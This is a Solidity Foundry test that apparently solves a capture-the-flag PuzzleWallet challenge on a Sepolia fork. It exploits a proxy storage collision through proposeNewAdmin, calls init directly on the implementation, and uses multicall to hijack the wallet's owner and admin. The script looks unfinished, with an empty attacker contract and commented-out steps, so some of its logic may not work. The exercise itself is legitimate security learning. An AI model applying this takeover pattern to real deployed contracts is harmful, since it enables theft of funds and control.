// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface PuzzleWallet{
    function whitelisted(address addr) external view returns (bool);
    function maxBalance() external view returns (uint256);
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function init(uint256 _maxBalance)external;
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function owner() external view returns (address);
    function addToWhitelist(address addr) external;
    function callme() external;
    function multicall(bytes[] calldata data) external payable;
}

contract Attacker {
    function attack() public{

    }
}

contract PuzzleWalletTest is Test {


    function setUp() public {
        vm.createSelectFork("sepolia", 5454970);
    }

    function test_puzzlewallet() public {
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        PuzzleWallet wallet = PuzzleWallet(0x086032F3A5D2D6a57a9eB81050Beb6f07f03D5F9);
        uint256 balance = uint256(uint160(address(this)));

        address initAdmin = wallet.admin();
        console.log("pendingAdmin: %s", wallet.pendingAdmin());
        console.log("whitelisted: %s", wallet.whitelisted(0x8AC4E3906688EfE71818531a9e439A7ABFDA0154));

        wallet.proposeNewAdmin(address(this));

        // address(wallet).call(abi.encodeWithSignature("callme()"));
        address impl = 0x7A95ccb0c54415594886a70Aec524B2F31dCF2C3;
        PuzzleWallet(impl).init(balance);

        require(address(this) == PuzzleWallet(impl).owner(), "PuzzleWalletTest: owner hijack failed");

        // PuzzleWallet(impl).addToWhitelist(address(this));
        wallet.addToWhitelist(address(this));
        console.log("maxBalance: %s", wallet.maxBalance());


        // wallet.setMaxBalance(balance);

        require(wallet.whitelisted(address(this)), "PuzzleWalletTest: expect whitelisted");

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("proposeNewAdmin(address)", address(this));
        wallet.multicall(data);


        require(wallet.admin() != initAdmin, "PuzzleWalletTest: admin should be changed");

        require(wallet.admin() == address(this), "PuzzleWalletTest: admin hijack failed");

    }

    function callme() public {
        console.log("callme success");
    }
}
